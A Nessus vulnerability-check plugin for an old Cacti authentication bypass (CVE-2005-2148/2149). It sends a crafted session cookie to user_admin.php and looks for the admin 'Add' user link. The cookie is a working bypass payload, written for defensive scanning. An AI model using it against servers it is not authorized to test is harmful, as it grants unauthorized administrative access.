#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18619);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/05/04 14:30:40 $");

  script_cve_id("CVE-2005-2148", "CVE-2005-2149");
  script_bugtraq_id(14027, 14130);
  script_osvdb_id(17719, 17720, 17721);

  script_name(english:"Cacti < 0.8.6f Authentication Bypass Vulnerability");
  script_summary(english:"Attempts to exploit the vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by
an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Cacti application running on the remote web server is affected by
an authentication bypass vulnerability.");
  # https://web.archive.org/web/20061130123447/http://www.hardened-php.net/index.30.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a392bde5");
  # https://web.archive.org/web/20061130122909/http://www.hardened-php.net/index.31.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?79df242f");
  # https://web.archive.org/web/20060502023335/http://www.hardened-php.net/index.33.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8090490f");
  script_set_attribute(attribute:"see_also", value:"http://www.cacti.net/release_notes_0_8_6f.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to Cacti 0.8.6f or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/07/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/07/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cacti:cacti");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("cacti_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/cacti");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

get_install_count(app_name:'cacti', exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'cacti', port:port, exit_on_fail:TRUE);

disable_cookiejar();
dir = install['dir'];

  # Try to exploit the authentication bypass flaw.
  r = http_send_recv3(port: port, method: 'GET',
    item: strcat(dir, "/user_admin.php"),
    add_headers: make_array("Cookie", "_SESSION[sess_user_id]=1;no_http_headers=1;"));
  if (isnull(r)) exit(0);

  # There's a problem if we get a link for adding users.
  if ('href="user_admin.php?action=user_edit">Add' >< r[2]) {
    security_hole(port);
    exit(0);
  }
